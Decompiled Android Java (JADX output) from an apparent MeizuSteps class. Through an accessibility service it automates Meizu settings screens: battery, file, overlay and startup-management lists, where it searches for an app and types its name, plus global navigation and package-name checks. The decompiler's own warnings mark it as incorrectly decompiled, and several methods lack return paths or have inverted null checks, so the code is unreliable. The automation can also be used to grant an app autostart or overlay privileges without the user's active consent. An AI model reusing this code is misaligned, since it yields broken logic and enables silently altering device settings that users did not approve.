    /* JADX WARN: Code restructure failed: missing block: B:29:0x0085, code lost:
    
        if (p000.b81.m210571b1(1000, r0) != r1) goto L31;
     */
    /* JADX WARN: Removed duplicated region for block: B:20:0x004f  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x0067  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x0062 -> B:23:0x0065). Please report as a decompilation issue!!! */
    /* renamed from: b1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212229b1(ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$returnToHome$1 meizuSteps$returnToHome$1;
        int i;
        int i2;
        C0366a3 c0366a3;
        C0366a3 c0366a32;
        if (continuationImpl instanceof MeizuSteps$returnToHome$1) {
            meizuSteps$returnToHome$1 = (MeizuSteps$returnToHome$1) continuationImpl;
            int i3 = meizuSteps$returnToHome$1.f54252a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                meizuSteps$returnToHome$1.f54252a5 = i3 - Integer.MIN_VALUE;
            } else {
                meizuSteps$returnToHome$1 = new MeizuSteps$returnToHome$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$returnToHome$1.f54250a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = meizuSteps$returnToHome$1.f54252a5;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i = 0;
            i2 = 6;
            c0366a3 = this;
            if (i >= i2) {
            }
            return coroutineSingletons;
        }
        if (i4 == 1) {
            i = meizuSteps$returnToHome$1.f54249a2;
            i2 = meizuSteps$returnToHome$1.f54248a1;
            C0366a3 c0366a33 = meizuSteps$returnToHome$1.f54247a0;
            kg1.m213544f4(obj);
            c0366a3 = c0366a33;
            i++;
            if (i >= i2) {
                c0366a3.f55081a0.performGlobalAction(1);
                meizuSteps$returnToHome$1.f54247a0 = c0366a3;
                meizuSteps$returnToHome$1.f54248a1 = i2;
                meizuSteps$returnToHome$1.f54249a2 = i;
                meizuSteps$returnToHome$1.f54252a5 = 1;
            } else {
                meizuSteps$returnToHome$1.f54247a0 = c0366a3;
                meizuSteps$returnToHome$1.f54252a5 = 2;
                if (b81.m210571b1(500L, meizuSteps$returnToHome$1) != coroutineSingletons) {
                    c0366a32 = c0366a3;
                    c0366a32.f55081a0.performGlobalAction(2);
                    meizuSteps$returnToHome$1.f54247a0 = null;
                    meizuSteps$returnToHome$1.f54252a5 = 3;
                }
            }
            return coroutineSingletons;
        }
        if (i4 != 2) {
            if (i4 != 3) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return C1351vv.f60710b1;
        }
        c0366a32 = meizuSteps$returnToHome$1.f54247a0;
        kg1.m213544f4(obj);
        c0366a32.f55081a0.performGlobalAction(2);
        meizuSteps$returnToHome$1.f54247a0 = null;
        meizuSteps$returnToHome$1.f54252a5 = 3;
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x009e, code lost:
    
        if (p000.b81.m210571b1(1500, r0) == r1) goto L29;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212230b2(String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$searchAppInBatteryList$1 meizuSteps$searchAppInBatteryList$1;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (continuationImpl instanceof MeizuSteps$searchAppInBatteryList$1) {
            meizuSteps$searchAppInBatteryList$1 = (MeizuSteps$searchAppInBatteryList$1) continuationImpl;
            int i = meizuSteps$searchAppInBatteryList$1.f54258a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$searchAppInBatteryList$1.f54258a5 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$searchAppInBatteryList$1 = new MeizuSteps$searchAppInBatteryList$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$searchAppInBatteryList$1.f54256a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$searchAppInBatteryList$1.f54258a5;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/search_src_text");
            if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                rootInActiveWindow.recycle();
                return Boolean.FALSE;
            }
            accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
            accessibilityNodeInfo.performAction(1);
            meizuSteps$searchAppInBatteryList$1.f54253a0 = str;
            meizuSteps$searchAppInBatteryList$1.f54254a1 = rootInActiveWindow;
            meizuSteps$searchAppInBatteryList$1.f54255a2 = accessibilityNodeInfo;
            meizuSteps$searchAppInBatteryList$1.f54258a5 = 1;
            if (b81.m210571b1(300L, meizuSteps$searchAppInBatteryList$1) != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return Boolean.TRUE;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = meizuSteps$searchAppInBatteryList$1.f54255a2;
        rootInActiveWindow = meizuSteps$searchAppInBatteryList$1.f54254a1;
        String str2 = meizuSteps$searchAppInBatteryList$1.f54253a0;
        kg1.m213544f4(obj);
        accessibilityNodeInfo = accessibilityNodeInfo2;
        str = str2;
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        accessibilityNodeInfo.performAction(2097152, bundle);
        accessibilityNodeInfo.recycle();
        rootInActiveWindow.recycle();
        meizuSteps$searchAppInBatteryList$1.f54253a0 = null;
        meizuSteps$searchAppInBatteryList$1.f54254a1 = null;
        meizuSteps$searchAppInBatteryList$1.f54255a2 = null;
        meizuSteps$searchAppInBatteryList$1.f54258a5 = 2;
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x009e, code lost:
    
        if (p000.b81.m210571b1(1500, r0) == r1) goto L29;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212231b3(String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$searchAppInFilesList$1 meizuSteps$searchAppInFilesList$1;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (continuationImpl instanceof MeizuSteps$searchAppInFilesList$1) {
            meizuSteps$searchAppInFilesList$1 = (MeizuSteps$searchAppInFilesList$1) continuationImpl;
            int i = meizuSteps$searchAppInFilesList$1.f54264a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$searchAppInFilesList$1.f54264a5 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$searchAppInFilesList$1 = new MeizuSteps$searchAppInFilesList$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$searchAppInFilesList$1.f54262a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$searchAppInFilesList$1.f54264a5;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/search_src_text");
            if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                rootInActiveWindow.recycle();
                return Boolean.FALSE;
            }
            accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
            accessibilityNodeInfo.performAction(1);
            meizuSteps$searchAppInFilesList$1.f54259a0 = str;
            meizuSteps$searchAppInFilesList$1.f54260a1 = rootInActiveWindow;
            meizuSteps$searchAppInFilesList$1.f54261a2 = accessibilityNodeInfo;
            meizuSteps$searchAppInFilesList$1.f54264a5 = 1;
            if (b81.m210571b1(300L, meizuSteps$searchAppInFilesList$1) != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return Boolean.TRUE;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = meizuSteps$searchAppInFilesList$1.f54261a2;
        rootInActiveWindow = meizuSteps$searchAppInFilesList$1.f54260a1;
        String str2 = meizuSteps$searchAppInFilesList$1.f54259a0;
        kg1.m213544f4(obj);
        accessibilityNodeInfo = accessibilityNodeInfo2;
        str = str2;
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        accessibilityNodeInfo.performAction(2097152, bundle);
        accessibilityNodeInfo.recycle();
        rootInActiveWindow.recycle();
        meizuSteps$searchAppInFilesList$1.f54259a0 = null;
        meizuSteps$searchAppInFilesList$1.f54260a1 = null;
        meizuSteps$searchAppInFilesList$1.f54261a2 = null;
        meizuSteps$searchAppInFilesList$1.f54264a5 = 2;
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x009e, code lost:
    
        if (p000.b81.m210571b1(1500, r0) == r1) goto L29;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212232b4(String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$searchAppInOverlayList$1 meizuSteps$searchAppInOverlayList$1;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (continuationImpl instanceof MeizuSteps$searchAppInOverlayList$1) {
            meizuSteps$searchAppInOverlayList$1 = (MeizuSteps$searchAppInOverlayList$1) continuationImpl;
            int i = meizuSteps$searchAppInOverlayList$1.f54270a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$searchAppInOverlayList$1.f54270a5 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$searchAppInOverlayList$1 = new MeizuSteps$searchAppInOverlayList$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$searchAppInOverlayList$1.f54268a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$searchAppInOverlayList$1.f54270a5;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/search_src_text");
            if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                rootInActiveWindow.recycle();
                return Boolean.FALSE;
            }
            accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
            accessibilityNodeInfo.performAction(1);
            meizuSteps$searchAppInOverlayList$1.f54265a0 = str;
            meizuSteps$searchAppInOverlayList$1.f54266a1 = rootInActiveWindow;
            meizuSteps$searchAppInOverlayList$1.f54267a2 = accessibilityNodeInfo;
            meizuSteps$searchAppInOverlayList$1.f54270a5 = 1;
            if (b81.m210571b1(300L, meizuSteps$searchAppInOverlayList$1) != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return Boolean.TRUE;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = meizuSteps$searchAppInOverlayList$1.f54267a2;
        rootInActiveWindow = meizuSteps$searchAppInOverlayList$1.f54266a1;
        String str2 = meizuSteps$searchAppInOverlayList$1.f54265a0;
        kg1.m213544f4(obj);
        accessibilityNodeInfo = accessibilityNodeInfo2;
        str = str2;
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        accessibilityNodeInfo.performAction(2097152, bundle);
        accessibilityNodeInfo.recycle();
        rootInActiveWindow.recycle();
        meizuSteps$searchAppInOverlayList$1.f54265a0 = null;
        meizuSteps$searchAppInOverlayList$1.f54266a1 = null;
        meizuSteps$searchAppInOverlayList$1.f54267a2 = null;
        meizuSteps$searchAppInOverlayList$1.f54270a5 = 2;
    }

    /* JADX WARN: Removed duplicated region for block: B:40:0x00ce  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x00d1  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212233b5(String str, ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$searchAppInStartupList$1 meizuSteps$searchAppInStartupList$1;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        C0366a3 c0366a3;
        C0366a3 c0366a32;
        AccessibilityNodeInfo rootInActiveWindow2;
        String string;
        if (continuationImpl instanceof MeizuSteps$searchAppInStartupList$1) {
            meizuSteps$searchAppInStartupList$1 = (MeizuSteps$searchAppInStartupList$1) continuationImpl;
            int i = meizuSteps$searchAppInStartupList$1.f54277a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$searchAppInStartupList$1.f54277a6 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$searchAppInStartupList$1 = new MeizuSteps$searchAppInStartupList$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$searchAppInStartupList$1.f54275a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$searchAppInStartupList$1.f54277a6;
        boolean z = false;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/search_src_text");
            boolean zIsEmpty = listFindAccessibilityNodeInfosByViewId.isEmpty();
            String str2 = this.f55083a2;
            if (zIsEmpty) {
                t60.m214704c5(str2, "[启动管理] 未找到搜索框");
                rootInActiveWindow.recycle();
                return Boolean.FALSE;
            }
            accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
            if (!accessibilityNodeInfo.performAction(1)) {
                t60.m214726f4(str2, "[启动管理] 搜索框聚焦失败");
            }
            meizuSteps$searchAppInStartupList$1.f54271a0 = this;
            meizuSteps$searchAppInStartupList$1.f54272a1 = str;
            meizuSteps$searchAppInStartupList$1.f54273a2 = rootInActiveWindow;
            meizuSteps$searchAppInStartupList$1.f54274a3 = accessibilityNodeInfo;
            meizuSteps$searchAppInStartupList$1.f54277a6 = 1;
            if (b81.m210571b1(300L, meizuSteps$searchAppInStartupList$1) != coroutineSingletons) {
                c0366a3 = this;
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            str = meizuSteps$searchAppInStartupList$1.f54272a1;
            c0366a32 = meizuSteps$searchAppInStartupList$1.f54271a0;
            kg1.m213544f4(obj);
            rootInActiveWindow2 = c0366a32.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow2 != null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow2.findAccessibilityNodeInfosByText(str);
            t60.m214694b5(listFindAccessibilityNodeInfosByText, "appNodes");
            if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
                    CharSequence text = accessibilityNodeInfo2.getText();
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    boolean zEquals = string.equals(str);
                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                        CharSequence className = accessibilityNodeInfo2.getClassName();
                        String string2 = className != null ? className.toString() : null;
                        if (!AbstractC0779a1.m213652a5(string2 != null ? string2 : "", "EditText", true) && zEquals) {
                            z = true;
                            break;
                        }
                    }
                }
            }
            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
            while (it2.hasNext()) {
                ((AccessibilityNodeInfo) it2.next()).recycle();
            }
            rootInActiveWindow2.recycle();
            if (z) {
                return Boolean.TRUE;
            }
            t60.m214704c5(c0366a32.f55083a2, "[启动管理] 搜索后未找到应用");
            return Boolean.FALSE;
        }
        AccessibilityNodeInfo accessibilityNodeInfo3 = meizuSteps$searchAppInStartupList$1.f54274a3;
        rootInActiveWindow = meizuSteps$searchAppInStartupList$1.f54273a2;
        String str3 = meizuSteps$searchAppInStartupList$1.f54272a1;
        c0366a3 = meizuSteps$searchAppInStartupList$1.f54271a0;
        kg1.m213544f4(obj);
        accessibilityNodeInfo = accessibilityNodeInfo3;
        str = str3;
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        if (!accessibilityNodeInfo.performAction(2097152, bundle)) {
            t60.m214726f4(c0366a3.f55083a2, "[启动管理] 输入应用名失败");
        }
        accessibilityNodeInfo.recycle();
        rootInActiveWindow.recycle();
        meizuSteps$searchAppInStartupList$1.f54271a0 = c0366a3;
        meizuSteps$searchAppInStartupList$1.f54272a1 = str;
        meizuSteps$searchAppInStartupList$1.f54273a2 = null;
        meizuSteps$searchAppInStartupList$1.f54274a3 = null;
        meizuSteps$searchAppInStartupList$1.f54277a6 = 2;
        if (b81.m210571b1(1500L, meizuSteps$searchAppInStartupList$1) != coroutineSingletons) {
            c0366a32 = c0366a3;
            rootInActiveWindow2 = c0366a32.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow2 != null) {
            }
        }
        return coroutineSingletons;
    }

    /* renamed from: b6 */
    public final boolean m212234b6(String str, List list) {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
        boolean z = false;
        if (rootInActiveWindow == null) {
            return false;
        }
        CharSequence packageName = rootInActiveWindow.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null) {
            string = "";
        }
        rootInActiveWindow.recycle();
        if (!list.isEmpty()) {
            Iterator it = list.iterator();
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                    z = true;
                    break;
                }
            }
        }
        if (!z) {
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("[", str, "] 包名不匹配: 期望=", AbstractC0715je.m213295i2(list, null, null, null, null, 63), ", 实际=");
            sbM41c2.append(string);
            t60.m214704c5(this.f55083a2, sbM41c2.toString());
        }
        return z;
    }
}
